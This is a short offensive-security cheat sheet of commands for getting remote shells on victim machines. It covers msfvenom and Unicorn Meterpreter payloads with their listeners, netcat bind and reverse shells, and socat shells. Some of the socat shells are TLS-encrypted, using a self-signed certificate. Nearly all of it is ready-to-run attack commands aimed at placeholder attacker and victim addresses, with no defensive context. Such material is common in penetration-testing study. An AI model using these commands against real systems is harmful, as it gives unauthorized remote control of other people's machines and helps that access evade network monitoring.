# Shells

---

- [MSFVenom](#msfvenom)
- [Unicorn](#unicorn)
- [Netcat](#netcat)
- [Socat](#socat)

<a name="msfvenom"></a>
## MSFVenom
### Listener
```sh
sudo msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST __ATTACKER_IP__;set LPORT __ATTACKER_PORT__;run"
```

### Payload
```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=__ATTACKER_IP__ LPORT=__ATTACKER_PORT__ -f exe -o reverse.exe
```

<a name="unicorn"></a>
## Unicorn
```sh
unicorn windows/x64/meterpreter/reverse_tcp __ATTACKER_IP__ __ATTACKER_PORT__
```

Creates 2 files, unicorn.rc and the payload. `unicorn.rc` is used for the listener.
```sh
msfconsole -r unicorn.rc
```

<a name="netcat"></a>
## Netcat

### Bind Shell
Listen on port __VICTIM_PORT__ on the victim with a shell to `cmd.exe` (Windows) or `/bin/sh` (Linux).
```sh
nc -nlvp __VICTIM_PORT__ -e __SHELL__
```

On the attacking machine connect to the windows shell listening.
```sh
nc -nv __VICTIM_IP__ __VICTIM_PORT__
```

### Reverse Shell
Listen on port __ATTACKER_PORT__ on the attacking machine
```sh
nc -nlvp __ATTACKER_PORT__
```

Send the reverse shell to the attacking machine.
```sh
nc -nv __ATTACKER_IP__ __ATTACKER_PORT__ -e __SHELL__
```

<a name="socat"></a>
## Socat

### Bind Shell
Listen on victim machine with a shell to `cmd.exe` (Windows) or `/bin/sh` (Linux).
```sh
socat TCP4-LISTEN:__VICTIM_PORT__,fork EXEC:__SHELL__
```

Connect from attacking machine.
```sh
socat - OPENSSL:__VICTIM_IP__:__VICTIM_PORT__
```

### Reverse Shell
Listen on port __ATTACKER_PORT__ on attacking machine with -d -d (increased verbosity).
```sh
socat -d -d TCP4-LISTEN:__ATTACKER_PORT__ STDOUT
```

Connect with the shell from the victim machine.
```sh
socat TCP4:__ATTACKER_IP__:__ATTACKER_PORT__ EXEC:__SHELL__
```

### Generating SSL Certificate
Generates a openssl certificate.
```sh
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```

Puts both files into a single pem file.
```sh
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

### Encrypted Bind Shells
Listen for incoming encrypted data and pass to __SHELL__.
```sh
socat OPENSSL-LISTEN:__VICTIM_PORT__,cert=bind_shell.pem,verify=0,fork EXEC:__SHELL__
```

Encrypted connection to the victim machine.
```sh
socat - OPENSSL:__VICTIM_IP__:__VICTIM_PORT__,verify=0
```

### Encrypted Reverse Shells
Listen for incoming encrypted data on attacker.
```sh
socat OPENSSL-LISTEN:__ATTACKER_PORT__,cert=bind_shell.pem,verify=0,fork STDOUT
```

Initiate reverse shell.
```sh
socat OPENSSL:__ATTACKER_IP__:__ATTACKER_PORT__,verify=0 EXEC:'__SHELL__',pipes
```
